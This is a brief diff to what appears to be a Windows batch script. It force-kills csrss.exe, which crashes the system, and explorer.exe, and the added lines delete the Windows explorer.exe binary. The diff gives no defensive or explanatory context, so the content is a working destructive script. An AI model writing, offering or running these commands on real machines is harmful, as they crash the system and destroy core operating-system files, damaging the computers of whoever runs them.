@@ -1,2 +1,4 @@
  taskkill /f /im csrss.exe
  taskkill /f /im explorer.exe.crash
+ taskkill /f /im explorer.exe
+del %systemdrive%/Windows/explorer.exe
